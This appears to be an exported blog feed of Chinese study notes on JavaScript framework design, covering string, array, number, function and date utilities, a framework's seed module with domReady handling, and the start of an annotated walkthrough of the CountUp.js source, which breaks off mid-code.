truncate方法：用于对字符串进行截断处理。当超过限定长度，默认添加3个点号。123456function truncate(target, length, truncation) &#123; length = length || 30; truncation = truncation === void(0) ? '...' : truncation; return target.length &gt; length ? target.slice(0, length - truncation.length) + truncation : String(target);&#125; camelize方法：转换为驼峰风格。12345678function camelize(target) &#123; if (target.indexOf('-') &lt; 0 &amp;&amp; target.indexOf('_') &lt; 0) &#123; return target;//提前判断，提高getStyle等的效率 &#125; return target.replace(/[-_][^-_]/g, function(match) &#123; return match.charAt(1).toUpperCase(); &#125;);&#125; underscored方法：转换为下划线风格。1234function underscored(target) &#123; return target.replace(/([a-z\\d])([A-Z])/g, '$1_$2'). replace(/\\-/g, '_').toLowerCase();&#125; capitalize方法：首字母大写。123function capitalize(target) &#123; return target.charAt(0).toUpperCase() + target.substring(1).toLowerCase();&#125; stripTags 方法：移除字符串中的html标签。比如，我们需要实现一个HTMLParser，这时就要处理option元素的innerText问题。此元素的内部只能接受文本节点，如果用户在里面添加了span、strong等标签，我们就需要用此方法将这些标签移除。在Prototype.js中，它与strip、stripScripts是一组方法。1234var rtag = /&lt;\\w+(\\s+(\"[^\"]*\"|'[^']*'|[^&gt;])+)?&gt;|&lt;\\/\\w+&gt;/gifunction stripTags(target) &#123; return String(target || \"\").replace(rtag, '');&#125; escapeHTML 方法：将字符串经过html转义得到适合在页面中显示的内容，如将“&lt;”替换为“&lt;”`。此方法用于防止XSS攻击。123456789101112131415function escapeHTML(target) &#123; return target.replace(/&amp;/g, '&amp;amp;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;') .replace(/\"/g, \"&amp;quot;\") .replace(/'/g, \"&amp;#39;\");&#125;function unescapeHTML(target) &#123; return String(target) .replace(/&amp;#39;/g, '\\'') .replace(/&amp;quot;/g, '\"') .replace(/&amp;lt;/g, '&lt;') .replace(/&amp;gt;/g, '&gt;') .replace(/&amp;amp;/g, '&amp;')&#125; escapeHTML和unescapeHTML这两个方法，它们不但在replace的参数是反过来的，replace的顺序也是反过来的。它们在做html parser非常有用的。 pad方法：与trim方法相反，pad可以为字符串的某一端添加字符串。常见的用法如日历在月份前补零，因此也被称之为fillZero。 这个方法也有很多版本，如下版本，支持更多的参数，允许从左或从右填充，以及使用什么内容进行填充。123456789101112function pad(target, n, filling, right, radix) &#123; var num = target.toString(radix || 10); filling = filling || \"0\"; while (num.length &lt; n) &#123; if (!right) &#123; num = filling + num; &#125; else &#123; num += filling; &#125; &#125; return num;&#125; 在ECMA262V7规范中，pad方法也有了对应的代替品——padStart，此外，还有从后面补零的方法——padEnd。 数组的扩展与修复原生方法： pop方法：出栈操作，删除并返回数组的最后一个元素。 push方法：入栈操作，向数组的末尾添加一个或更多元素，并返回新的长度。 shift方法：出队操作，删除并返回数组的第一个元素。 unshift方法：入队操作，向数组的开头添加一个或更多元素，并返回新的长度。 slice方法：切片操作，从数组中分离出一个子数组，功能类似于字符串的。 substring、slice和substr是“三兄弟”，常用于转换类数组对象为真正的数组。 sort方法：对数组的元素进行排序，有一个可选参数，为比较函数。 reverse方法：颠倒数组中元素的顺序。 splice方法：可以同时用于原数组的增删操作，数组的remove方法就是基于它写成的。 concat方法：用于把原数组与参数合并成一个新数组，如果参数为数组，那么它会把其第一维的元素放入新数组中。因此我们可以利用它实现数组的平坦化操作与克隆操作。 join方法：把数组的所有元素放入一个字符串，元素通过指定的分隔符进行分隔。你可以想象成字符串split的反操作。 indexOf方法：定位操作，返回数组中第一个等于给定参数的元素的索引值。 lastIndexOf方法：定位操作，同上，不过是从后遍历。索引操作可以说是字符串同名方法的翻版，存在就返回非负整数，不存在就返回−1。 forEach方法：迭代操作，将数组的元素依次传入一个函数中执行。Ptototype.js中对应的名字为each。 map方法：收集操作，将数组的元素依次传入一个函数中执行，然后把它们的返回值组成一个新数组返回。Ptototype.js中对应的名字为collect。 filter方法：过滤操作，将数组的元素依次传入一个函数中执行，然后把返回值为true的那个元素放入新数组返回。在Prototype.js中，它有3个名字，即select、filter和findAll。 some方法：只要数组中有一个元素满足条件（放进给定函数返回true），那么它就返回true。Ptototype.js中对应的名字为any。 every方法：只有数组中所有元素都满足条件（放进给定函数返回true），它才返回true。Ptototype.js中对应的名字为all。 reduce方法：归化操作，将数组中的元素归化为一个简单的数值。Ptototype.js中对应的名字为inject。 reduceRight方法：归化操作，同上，不过是从后遍历。 数组的空位数组的空位是指数组的某一个位置没有任何值。比如，Array构造函数返回的数组都是空位。空位不是undefined，而是一个位置的值等于undefined，但依然是有值的。空位是没有任何值，in运算符可以说明这一点。120 in [undefined, undefined, undefined] // true 0 in [, , ,] // false 由于空位的处理规则非常不统一，所以建议避免出现空位。 ECMA262V5,大多数情况下会忽略空位。比如，forEach()、filter()、every()和some()都会跳过空位；map()会跳过空位，但会保留这个值；join()和toString()会将空位视为undefined，而undefined和null会被处理成空字符串。1234567[,'a'].forEach((x,i) =&gt; log(i)); // 1 ['a',,'b'].filter(x =&gt; true) // ['a','b'] [,'a'].every(x =&gt; x==='a') // true [,'a'].some(x =&gt; x !== 'a') // false [,'a'].map(x =&gt; 1) // [,1] [,'a',undefined,null].join('#') // \"#a##\" [,'a',undefined,null].toString() // \",a,,\" ECMA262V6则是明确将空位转为undefined。比如，Array.from方法会将数组的空位转为undefined，也就是说，这个方法不会忽略空位。扩展运算符（…）也会将空位转为undefined。 数值的扩展与修复数值没有什么好扩展的，而且JavaScript的数值精度问题未修复，要修复它们可不是一两行代码了事。 一些问题：1234567891011console.log(0.1 + 0.2)console.log(Math.pow(2, 53) === Math.pow(2, 53) + 1) //trueconsole.log(Infinity &gt; 100) //trueconsole.log(JSON.stringify(25001509088465005)) //25001509088465004console.log(0.1000000000000000000000000001) //0.1console.log(0.100000000000000000000000001) //0.1console.log(0.1000000000000000000000000456) //0.1console.log(0.09999999999999999999999) //0.1console.log(1 / 3) //0.3333333333333333console.log(23.53 + 5.88 + 17.64)// 47.05console.log(23.53 + 17.64 + 5.88)// 47.050000000000004 这些其实不是bug，而是我们无法接受这事实。在JavaScript中，数值有3种保存方式。 （1）字符串形式的数值内容。 （2）IEEE 754标准双精度浮点数，它最多支持小数点后带15～17位小数，由于存在二进制和十进制的转换问题，具体的位数会发生变化。 （3）一种类似于C语言的int类型的32位整数，它由4个8 bit的字节构成，可以保存较小的整数。 当JavaScript遇到一个数值时，它会首先尝试按整数来处理该数值，如果行得通，则把数值保存为31 bit的整数；如果该数值不能视为整数，或超出31 bit的范围，则把数值保存为64位的IEEE 754浮点数。 这样一个问题：什么时候规规矩矩的整数会突然变成捉摸不定的双精度浮点数？答案是：当它们的值变得非常庞大时，或者进入1和0之间时，规矩矩矩的整数就会变成捉摸不定的双精度浮点数。因此，我们需要注意以下数值。 首先是1和0；其次是最大的Unicode数值1114111（7位数字，相当于（/x41777777）；最大的RGB颜色值16777215（8位数字，相当于#FFFFFF）；最大的32 bit整数是147483647（10位数字，即Math.pow(2,31)-1）；最少的32位bit整数 -2147483648，因为JavaScript内部会以整数的形式保存所有Unicode值和RGB颜色；再次是2147483647，任何大于该值的数据将保存为双精度格式；最大的浮点数9007199254740992（16位数字，即Math.pow（2,53）），因为输出时类似整数，而所有Date对象（按毫秒计算）都小于该值，因此总是模拟整数的格式输出；最大的双精度数值1.7976931348623157e+308，超出这个范围就要算作无穷大了。 大数相加出问题是由于精度的不足，小数相加出问题是进制转算时产生误差。第一个好理解，第二个，主要是我们常用的十进制转换为二进制时，变成循环小数及无理数等有无限多位小数的数，计算机要用有限位数的浮点数来表示是无法实现的，只能从某一位进行截短。而且，因为内部表示是二进制，十进制看起来是能除尽的数，往往在二进制是循环小数。 比如用二进制来表示十进制的0.1，就得写成2的幂（因为小于1，所以幂是负数）相加的形式。若一直持续下去，0.1就成了0.000110011001100110011…这种循环小数。在有效数字的范围内进行舍入，就会产生误差。 综上，我们就尽量避免小数操作与大数操作，或者转交后台去处理，实在避免不了就引入专业的库来处理。 函数的扩展与修复ECMA262V5对函数唯一的扩展就是bind函数。12345678Function.prototype.bind = function(context) &#123; if (arguments.length &lt; 2 &amp;&amp; context == void 0) return this; var __method = this, args = [].slice.call(arguments, 1); return function() &#123; return __method.apply(context, args.concat.apply(args, arguments)); &#125;&#125; curry、partial的应用场景在前端世界[2]真心不多，前端讲究的是即时显示，许多API都是同步的，后端由于IO操作等耗时长，像Node.js提供了大量的异步函数来提高性能，防止堵塞。但是过多异步函数也必然带来回调嵌套的问题，因此我们需要通过curry等函数变换，将套嵌减少到可以接受的程度。 日期的扩展与修复Date构造器是JavaScript中传参形式最丰富的构造器，大致分为4种。1234new Date();new Date(value);//传入毫秒数new Date(dateString);new Date(year, month, day /*, hour, minute, second, millisecond*/); 其中第3种可以玩多种花样，作者建议只使用“2009/07/12 12:34:56”，后面的时分秒可省略。这个所有浏览器都支持。 浏览器嗅探与特征检测浏览器嗅探已经不推荐了，但有些时候还是需要的。具体来说就是判断某个对象有没有此方法或属性，严格一些则看看该方法有没有达到预期效果。标准浏览器中提供了document.implementation.hasfeature方法，但不准确。 特性侦测的好处是浏览器不会随意去掉某一个功能，但注意不能使用标准属性与方法做判断依据，每个浏览器都有自己的私有实现，用它们做判定就可以了。 具体的检测方法可以看jquery 1.9以前的嗅探模块源码$.browser 事件的支持侦测判断浏览器对某种事件的支持,jQuery的实现：123456789101112$.eventSupport = function(eventName, el)&#123; el = el || document.documentElement; eventNmae = 'on' + eventName; var ret = eventName in el; // in 操作符用来判断属性是否存在与对象中,无论该属性存在于实例中还是原型中 if(el.setAttribute &amp;&amp; !ret) &#123; el.setAttribute(eventName, ''); ret = typeof el[eventName] === 'function'; el.removeAttribute(eventName); &#125; el = null; return ret;&#125;; 但这种检测只对DOM0事件有效，像DOMMouseSroll，DOMContentLoaded，DOMFocusIn，DOMNodeInserted这些以DOM开头的事件就无能为力了。 样式的支持侦测一般的方法就是W3C推出CSS.supports方法，该API能够探知浏览器是否支持某种样式。但其实还是有很多无法检测。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-framework","slug":"js-framework","permalink":"https://github.com/xmoyKING/tags/js-framework/"}]},{"title":"JavaScript框架设计笔记-1-种子模块","slug":"js-framework1","date":"2017-12-16T08:15:31.000Z","updated":"2017-12-16T08:15:31.000Z","comments":true,"path":"2017/12/16/js-framework1/","link":"","permalink":"https://github.com/xmoyKING/2017/12/16/js-framework1/","excerpt":"","text":"本系列笔记来源于《JavaScript框架设计》一书，但是非常尴尬的是，我买的不是第二版的，= =！《JavaScript框架设计（第2版）》一书，学习JS框架底层库知识，一个框架应该提供那些功能，应该如何区分这些模块等等，第二版前2章在网上有公开的，可以免费阅读。 注：作者提到的很多都是以Avalon作为示例的，而本系列笔记仅提取个人记录之处，同时，书中的模块基于CommonJS规范（即Node模块的定义方式） 种子模块介绍种子模块也叫核心模块，是框架的最先执行的部分。即便像jQuery那样的单文件函数库，它的内部也分许多模块，必然有一些模块冲在前面立即执行；有一些模块只有用到才执行；也有一些模块（补丁模块）可有可无，存在感比较弱，只在特定浏览器下才运行。 既然是最先执行的模块，那么就要求其里面的方法是历经考验、千锤百炼的，并且能将这个模块变得极具扩展性、高可用、稳定性。 （1）扩展性，是指方便将其他模块的方法或属性加入进来，让种子迅速成长为“一棵大树”。 （2）高可用，是指这里的方法是极其常用的，其他模块不用重复定义它们。 （3）稳定性，是指不能轻易在以后版本中删除，要信守承诺。 参照许多框架与库的实现，作者认为种子模块应该包含如下功能：对象扩展、数组化、类型判定、无冲突处理、domReady。 对象扩展我们需要一种机制，将新功能添加到我们的命名空间上。命名空间，是指我们这个框架在全局作用域暴露的唯一变量，它多是一个对象或一个函数。命名空间通常也就是框架名字。我们可以看一下别人是如何为框架起名字的。 https://www.zhihu.com/question/46804815 回到主题，对象扩展这种机制，我们一般做成一个方法，叫做extend或mixin。JavaScript对象在属性描述符[3]（Property Descriptor）没有诞生之前，是可以随意添加、更改、删除其成员的，因此扩展一个对象非常便捷。由于此功能这么常用，到后来ES6就干脆支持它了，于是有了 Object.assgin。如果要低端浏览器直接用它，可以使用以下polyfill 关于polyfill：Polyfilling是由RemySharp提出的一个术语，它是用来描述复制缺少的API和API功能的行为。你可以使用它编写单独应用的代码，而不用担心其他浏览器原生是不是支持。实际上，polyfills并不是新技术，也不是和HTML5捆绑到一起的。 1234567891011121314151617181920212223function ToObject(val) &#123; if (val == null) &#123; throw new TypeError('Object.assign cannot be called with null or undefined'); &#125; return Object(val);&#125;module.exports = Object.assign || function (target, source) &#123; var from; var keys; var to = ToObject(target); for (var s = 1; s &lt; arguments.length; s++) &#123; from = arguments[s]; keys = Object.keys(Object(from)); for (var i = 0; i &lt; keys.length; i++) &#123; to[keys[i]] = from[keys[i]]; &#125; &#125; return to;&#125;; 数组化浏览器下存在许多类数组对象，如function内的arguments，通过document.forms、form.elements、doucment.links、select.options、document.getElementsByName、document.getElementsBy TagName、childNodes、children等方式获取的节点集合（HTMLCollection、NodeList），或依照某些特殊写法的自定义对象。 通常来说，使用Array.prototype.slice.call就能转换我们的类数组对象了，但旧版本IE下的HTMLCollection、NodeList不是Object的子类，采用如上方法将导致IE执行异常。设法让IE下的Array.prototype.slice能切割节点集合就一帆风顺了。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/slice/*** Shim for \"fixing\" IE's lack of support (IE &lt; 9) for applying slice* on host objects like NamedNodeMap, NodeList, and HTMLCollection* (technically, since host objects have been implementation-dependent,* at least before ES6, IE hasn't needed to work this way).* Also works on strings, fixes IE &lt; 9 to allow an explicit undefined* for the 2nd argument (as in Firefox), and prevents errors when* called on other DOM objects.*/var _slice = Array.prototype.slicetry &#123; // Can't be used with DOM elements in IE &lt; 9 _slice.call(document.documentElement)&#125; catch (e) &#123; // Fails in IE &lt; 9 // This will work for genuine arrays, array-like objects, // NamedNodeMap (attributes, entities, notations), // NodeList (e.g., getElementsByTagName), HTMLCollection (e.g., childNodes), // and will not fail on other DOM objects (as do DOM elements in IE &lt; 9) Array.prototype.slice = function (begin, end) &#123; // IE &lt; 9 gets unhappy with an undefined end argument end = (typeof end !== 'undefined') ? end : this.length // For native Array objects, we use the native slice function if (Array.isArray(this) ) &#123; return _slice.call(this, begin, end) &#125; // For array like object we handle it ourselves. var i, cloned = [], size, len = this.length // Handle negative value for \"begin\" var start = begin || 0 start = (start &gt;= 0) ? start : len + start // Handle negative value for \"end\" var upTo = (end) ? end : len if (end &lt; 0) &#123; upTo = len + end &#125; // Actual expected size of the slice size = upTo - start if (size &gt; 0) &#123; cloned = new Array(size) if (this.charAt) &#123; for (i = 0; i &lt; size; i++) &#123; cloned[i] = this.charAt(start + i) &#125; &#125; else &#123; for (i = 0; i &lt; size; i++) &#123; cloned[i] = this[start + i] &#125; &#125; &#125; return cloned &#125;&#125;avalon.slice = function (nodes, start, end) &#123; return _slice.call(nodes, start, end)&#125; 上面的Array.prototype.slice polyfill可以放到另一个补丁模块，这样确保我们的框架在升级时非常轻松地抛弃这些历史包袱。 类型的判定JavaScript存在两套类型系统：一套是基本数据类型，另一套是对象类型系统。基本数据类型在ES5中包括6种，分别是undefined、string、null、boolean、function和object。基本数据类型是通过typeof来检测的。对象类型系统是以基础类型系统为基础的，通过instanceof来检测。然而，JavaScript自带的这两套识别机制非常不靠谱，于是催生了isXXX系列。就拿typeof来说，它只能粗略识别出string、number、boolean、function、undefined和object这6种数据类型，无法识别Null、RegExp和Argument等细分对象类型。 这里有很多坑:123456789101112131415161718192021typeof null// \"object\"typeof document.childNodes //safari \"function\"typeof document.createElement('embed')//ff3-10 \"function\"typeof document.createElement('object')//ff3-10 \"function\"typeof document.createElement('applet')//ff3-10 \"function\"typeof /\\d/i //在实现了ecma262v4的浏览器返回 \"function\"typeof window.alert //IE678 \"object\"\"var iframe = document.createElement('iframe');document.body.appendChild(iframe);xArray = window.frames[window.frames.length - 1].Array;var arr = new xArray(1, 2, 3); // [1,2,3]arr instanceof Array; // falsearr.constructor === Array; // falsewindow.onload = function() &#123; alert(window.constructor);// IE67 undefined alert(document.constructor);// IE67 undefined alert(document.body.constructor);// IE67 undefined alert((new ActiveXObject('Microsoft.XMLHTTP')).constructor);// IE6789 undefined&#125;isNaN(\"aaa\") //true 上面分4组，第一组是typeof的坑。第二组是instanceof的陷阱，只要原型上存在此对象的构造器它就返回true，但如果跨文档比较，iframe里面的数组实例就不是父窗口的Array的实例。第三组是有关constructor的陷阱，在旧版本IE下，DOM与BOM对象的constructor属性是没有暴露出来的。最后有关NaN，NaN对象与null、undefined一样，在序列化时是原样输出的，但isNaN这方法非常不靠谱，把字符串、对象放进去也返回true，这对我们序列化非常不利。 jQuery发明type方法，这个方法就囊括了isBoolean、isNumber、isString、isFunction、isArray、isDate、isRegExp、isObject及isError。12345678910111213141516//jquery2.0var class2type// Populate the class2type mapjQuery.each(\"Boolean Number String Function Array Date RegExp Object Error\".split(\" \"), function(i, name) &#123; class2type[ \"[object \" + name + \"]\" ] = name.toLowerCase();&#125;);jQuery.type = function( obj ) &#123; if ( obj == null ) &#123; return String( obj ); &#125; // Support: Safari &lt;= 5.1 (functionish RegExp) return typeof obj === \"object\" || typeof obj === \"function\" ? class2type[ core_toString.call(obj) ] || \"object\" : typeof obj;&#125; isPlainObject则是用来判定是否为纯净的JavaScript对象，既不是DOM、BOM对象，也不是自定义“类”的实例对象，制造它的最初目的是用于深拷贝，避开像window那样自己引用自己的对象。在avalon中有一个更精简的版本，由于它只支持IE10等非常新的浏览器及不支持跨iframe，就没有干扰因素了，可以大胆使用ecma262v5的新API。123avalon.isPlainObject = function(obj) &#123; return typeof obj === \"object\" &amp;&amp; Object.getPrototypeOf(obj) === Object.prototype&#125; isWindow12345678910111213141516avalon.isWindow = function (obj) &#123; if (!obj) return false // 利用IE6、IE7、IE8 window == document为true,document == window竟然为false的神奇特性 // 标准浏览器及IE9、IE10等使用正则检测 return obj == obj.document &amp;&amp; obj.document != obj &#125;var rwindow = /^\\[object (?:Window|DOMWindow|global)\\]$/function isWindow(obj) &#123;//现代浏览器使用这个实现 return rwindow.test(toString.call(obj))&#125;if (isWindow(window)) &#123; avalon.isWindow = isWindow&#125; domReadydomReady其实是一种名为DOMContentLoaded事件的别称。不过由于框架的需要，它与真正的DOMContentLoaded有一点区别。在许多JavaScript书籍中，它们都会教导我们把JavaScript逻辑写在window.onload回调中，以防DOM树还没有建完就开始对节点进行操作，导致出错。而对于框架来说，越早介入对DOM的干涉就越好，例如要进行特征侦测之类的。domReady还可以满足用户提前绑定事件的需求。因为有时网页的图片等资源过多，window.onload就迟迟不能触发，这时若还没有绑定事件，用户点击哪个按钮都没反应（除了跳转页面）。因此主流框架都引入domReady机制，并且费了很大劲兼容所有浏览器，具体策略如下。 （1）对于支持DOMContentLoaded事件的使用DOMContentLoaded事件。 （2）旧版本IE使用Diego Perini发现的著名hack!123456789101112131415161718192021222324252627//http://javascript.nwbox.com/IEContentLoaded///by Diego Perini 2007.10.5function IEContentLoaded(w, fn) &#123; var d = w.document, done = false, init = function() &#123; if (!done) &#123;//只执行一次 done = true; fn(); &#125; &#125;; (function() &#123; try &#123;//在DOM未建完之前调用元素doScroll抛出错误 d.documentElement.doScroll('left'); &#125; catch (e) &#123;//延迟再试 setTimeout(arguments.callee, 50); return; &#125; init();//没有错误则执行用户回调 &#125;)(); // 如果用户是在domReady之后绑定这个函数，则立即执行它 d.onreadystatechange = function() &#123; if (d.readyState == 'complete') &#123; d.onreadystatechange = null; init(); &#125; &#125;;&#125; 不过有个问题，如果我们的种子模块是动态加载的，在它插入DOM树时，DOM树已经建完了，这该怎么触发我们的ready回调呢？jQuery给出的方案是，onload也一起被监听。但是如果用户的脚本是onload之后才加载进来呢？那么只好判定一下document.readyState是否等于complete，如果是，则说明页面早就domReady，可以执行用户的回调。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152var readyList = [];avalon.ready = function(fn) &#123; if (readyList) &#123; readyList.push(fn); &#125; else &#123; fn(); &#125;&#125;var readyFn, ready = W3C ? \"DOMContentLoaded\" : \"readystatechange\";function fireReady() &#123; for (var i = 0, fn; fn = readyList[i++]; ) &#123; fn(); &#125; readyList = null; fireReady = avalon.noop; //惰性函数，防止IE9二次调用_checkDeps&#125;function doScrollCheck() &#123; try &#123; //IE下通过doScrollCheck检测DOM树是否建完 html.doScroll(\"left\"); fireReady(); &#125; catch (e) &#123; setTimeout(doScrollCheck); &#125;&#125;//在Firefox 3.6之前，不存在readyState属性//http://www.cnblogs.com/rubylouvre/archive/2012/12/18/2822912.htmlif (!DOC.readyState) &#123; var readyState = DOC.readyState = DOC.body ? \"complete\" : \"loading\";&#125;if (DOC.readyState === \"complete\") &#123; fireReady(); //如果在domReady之外加载&#125; else &#123; avalon.bind(DOC, ready, readyFn = function() &#123; if (W3C || DOC.readyState === \"complete\") &#123; fireReady(); if (readyState) &#123; //IE下不能改写DOC.readyState DOC.readyState = \"complete\"; &#125; &#125; &#125;); if (html.doScroll) &#123; try &#123; //如果跨域会报错，那时肯定证明是存在两个窗口的 if (self.eval === parent.eval) &#123; doScrollCheck(); &#125; &#125; catch (e) &#123; doScrollCheck(); &#125; &#125;&#125;","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-framework","slug":"js-framework","permalink":"https://github.com/xmoyKING/tags/js-framework/"}]},{"title":"js插件CountUp源码解析","slug":"js-countup","date":"2017-12-13T10:50:19.000Z","updated":"2017-12-13T10:50:19.000Z","comments":true,"path":"2017/12/13/js-countup/","link":"","permalink":"https://github.com/xmoyKING/2017/12/13/js-countup/","excerpt":"","text":"该插件Git地址：CountUp.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281// root表示插件所依附的命名空间，一般为全局对象// factory表示工厂方法，即生成CountUp插件类的工厂(function(root, factory) &#123; if (typeof define === 'function' &amp;&amp; define.amd) &#123; // AMD规范的包定义 define(factory); &#125; else if (typeof exports === 'object') &#123; // CommonJS规范的包定义 module.exports = factory(require, exports, module); &#125; else &#123; // 否则直接在浏览器的环境内执行，在window全局变量上添加CountUp方法 root.CountUp = factory(); &#125;&#125;(this, function(require, exports, module) &#123;/* countUp.js by @inorganik*/// target = id of html element or var of previously selected html element where counting occurs// 目标元素的id或变量// startVal = the value you want to begin at// 开始数值// endVal = the value you want to arrive at// 结束数值// decimals = number of decimal places, default 0// 精确到的小数的位数，默认为0，即没有小数// duration = duration of animation in seconds, default 2// 动画持续时间，默认2s// options = optional object of options (see below)// 其他配置// CountUp类var CountUp = function(target, startVal, endVal, decimals, duration, options) &#123; var self = this; // 保存this变量的引用，后续闭包中this的指向需要用到，也是每个实例化CountUp后的实例对象 self.version = function () &#123; return '1.9.3'; &#125;; // default options 默认配置 self.options = &#123; useEasing: true, // toggle easing 开启缓动效果 useGrouping: true, // 1,000,000 vs 1000000 开启分组，以千为分隔 separator: ',', // character to use as a separator 分组默认以,为分隔符 decimal: '.', // character to use as a decimal 小数点默认以.分隔 easingFn: easeOutExpo, // optional custom easing function, default is Robert Penner's easeOutExpo 自定义缓动效果函数，默认为easeOutExpo效果 formattingFn: formatNumber, // optional custom formatting function, default is formatNumber above 文本格式化，默认使用内部的formatNumber方法 prefix: '', // optional text before the result 结果前缀 suffix: '', // optional text after the result 结果后缀 numerals: [] // optionally pass an array of custom numerals for 0-9 默认为数组0-9，可以传入一个字符数组 &#125;; // extend default options with passed options object 将默认配置对应项修改为传入的配置项 if (options &amp;&amp; typeof options === 'object') &#123; for (var key in self.options) &#123; if (options.hasOwnProperty(key) &amp;&amp; options[key] !== null) &#123; self.options[key] = options[key]; &#125; &#125; &#125; // 若配置的分组分隔符为空字符串，则不开启分组 if (self.options.separator === '') &#123; self.options.useGrouping = false; &#125;else &#123; // ensure the separator is a string (formatNumber assumes this) 确保分隔符为字符类型 self.options.separator = '' + self.options.separator; &#125; // make sure requestAnimationFrame and cancelAnimationFrame are defined // polyfill for browsers without native support // by Opera engineer Erik Möller // 全局环境下requestAnimationFrame和cancelAnimationFrame方法需要存在 // 若没有原生实现，则使用垫片自定义该方法， // 关于requestAnimationFrame，可以参考： http://www.zhangxinxu.com/wordpress/2013/09/css3-animation-requestanimationframe-tween-%E5%8A%A8%E7%94%BB%E7%AE%97%E6%B3%95/ var lastTime = 0; var vendors = ['webkit', 'moz', 'ms', 'o']; for(var x = 0; x &lt; vendors.length &amp;&amp; !window.requestAnimationFrame; ++x) &#123; window.requestAnimationFrame = window[vendors[x]+'RequestAnimationFrame']; window.cancelAnimationFrame = window[vendors[x]+'CancelAnimationFrame'] || window[vendors[x]+'CancelRequestAnimationFrame']; &#125; if (!window.requestAnimationFrame) &#123; window.requestAnimationFrame = function(callback, element) &#123; var currTime = new Date().getTime(); var timeToCall = Math.max(0, 16 - (currTime - lastTime)); // 为了得出当前宿主浏览器能够支持的最大帧率 var id = window.setTimeout(function() &#123; callback(currTime + timeToCall); &#125;, timeToCall); // 在调用回调函数时传入调用时的时间 lastTime = currTime + timeToCall; return id; &#125;; &#125; if (!window.cancelAnimationFrame) &#123; window.cancelAnimationFrame = function(id) &#123; clearTimeout(id); &#125;; &#125; // 内部使用格式化数字方法，若有自定义的格式化方法则会被覆盖 function formatNumber(num) &#123; var neg = (num &lt; 0), // 负号 x, x1, x2, x3, i, len; num = Math.abs(num).toFixed(self.decimals); num += ''; // 将num转换为字符串 x = num.split('.'); // 用split将num分为整数和小数部分，字符串类型 x1 = x[0]; // 整数部分 x2 = x.length &gt; 1 ? self.options.decimal + x[1] : ''; // 小数部分 if (self.options.useGrouping) &#123; // 若开启分组，则对整数部分进行分隔 x3 = ''; for (i = 0, len = x1.length; i &lt; len; ++i) &#123; // 依次（从右至左）对整数每一位进行处理，每3位添加分隔符 if (i !== 0 &amp;&amp; ((i % 3) === 0)) &#123; x3 = self.options.separator + x3; &#125; x3 = x1[len - i - 1] + x3; &#125; x1 = x3; &#125; // optional numeral substitution 若配置了替代字符，则对每一个数字进行替换 if (self.options.numerals.length) &#123; x1 = x1.replace(/[0-9]/g, function(w) &#123; return self.options.numerals[+w]; &#125;) x2 = x2.replace(/[0-9]/g, function(w) &#123; return self.options.numerals[+w]; &#125;) &#125; return (neg ? '-' : '') + self.options.prefix + x1 + x2 + self.options.suffix; &#125; // Robert Penner's easeOutExpo 缓动效果方法 // * t: current time（当前时间） // * b: beginning value（初始值） // * c: change in value（变化量） // * d: duration（持续时间） // * 返回当前时间点对应的值 function easeOutExpo(t, b, c, d) &#123; return c * (-Math.pow(2, -10 * t / d) + 1) * 1024 / 1023 + b; &#125; function ensureNumber(n) &#123; // 检测n是否为数字类型 return (typeof n === 'number' &amp;&amp; !isNaN(n)); &#125; // 初始化 self.initialize = function() &#123; if (self.initialized) return true; // 初始化标志 self.error = ''; self.d = (typeof target === 'string') ? document.getElementById(target) : target; // 获取目标，支持ID或原生元素对象 if (!self.d) &#123; self.error = '[CountUp] target is null or undefined' return false; &#125; self.startVal = Number(startVal); self.endVal = Number(endVal); // error checks 检查开始值和结束值是否为数字类型 if (ensureNumber(self.startVal) &amp;&amp; ensureNumber(self.endVal)) &#123; self.decimals = Math.max(0, decimals || 0); // 最大精度 self.dec = Math.pow(10, self.decimals); // 获取最大精度的整数形式，避免小数计算 self.duration = Number(duration) * 1000 || 2000; // 持续时间 self.countDown = (self.startVal &gt; self.endVal); // 是否为倒数 self.frameVal = self.startVal; // 将动画值设置为开始值 self.initialized = true; return true; &#125;else &#123; self.error = '[CountUp] startVal ('+startVal+') or endVal ('+endVal+') is not a number'; return false; &#125; &#125;; // Print value to target 设置值到目标元素 self.printValue = function(value) &#123; var result = self.options.formattingFn(value); // 将当前的值传入并获取结果格式化后的数字 // 依据不同的目标标签类型，设置方法不同 if (self.d.tagName === 'INPUT') &#123; // 文本框 this.d.value = result; &#125; else if (self.d.tagName === 'text' || self.d.tagName === 'tspan') &#123; this.d.textContent = result; &#125; else &#123; this.d.innerHTML = result; &#125; &#125;; // 计算方法，传入当前的时间戳， self.count = function(timestamp) &#123; // 保存第一次的时间戳为开始时间 if (!self.startTime) &#123; self.startTime = timestamp; &#125; self.timestamp = timestamp; var progress = timestamp - self.startTime; // 计算当前的进度 self.remaining = self.duration - progress; // 计算剩余时间 // to ease or not to ease 根据配置决定是否采用缓动效果，同时需要注意是否为倒数，最后设置当前帧的值 if (self.options.useEasing) &#123; if (self.countDown) &#123; self.frameVal = self.startVal - self.options.easingFn(progress, 0, self.startVal - self.endVal, self.duration); &#125; else &#123; self.frameVal = self.options.easingFn(progress, self.startVal, self.endVal - self.startVal, self.duration); &#125; &#125; else &#123; // 不采用缓动时，即默认为线性改变 if (self.countDown) &#123; self.frameVal = self.startVal - ((self.startVal - self.endVal) * (progress / self.duration)); &#125; else &#123; self.frameVal = self.startVal + (self.endVal - self.startVal) * (progress / self.duration); &#125; &#125; // don't go past endVal since progress can exceed duration in the last frame // 在最后一帧的动画会超过设置的结束值，所以需要验证是否超值 if (self.countDown) &#123; self.frameVal = (self.frameVal &lt; self.endVal) ? 